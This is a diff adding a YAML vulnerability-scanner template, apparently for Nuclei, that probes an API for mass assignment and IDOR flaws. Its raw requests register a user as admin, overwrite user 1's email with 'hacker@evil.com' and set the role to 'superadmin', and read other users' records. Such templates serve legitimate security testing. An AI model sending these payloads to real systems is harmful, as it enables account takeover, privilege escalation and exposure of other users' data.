@@ -1,0 +1,55 @@
+id: mass-assignment-idor
+
+info:
+  name: Mass Assignment & IDOR Detection
+  author: DAAKU
+  severity: high
+  description: Tests for mass assignment vulnerabilities and IDOR
+  tags: idor,mass-assignment,api
+
+http:
+  - raw:
+      - |
+        POST /api/users/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": "test", "password": "test123", "role": "admin", "isAdmin": true}
+        
+      - |
+        PUT /api/users/profile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"id": 1, "email": "hacker@evil.com", "role": "superadmin"}
+        
+      - |
+        GET /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        GET /api/users/2 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "superadmin"
+          - "role"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          - 201
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - ".['id']"
+          - ".['role']"
+          - ".['email']"
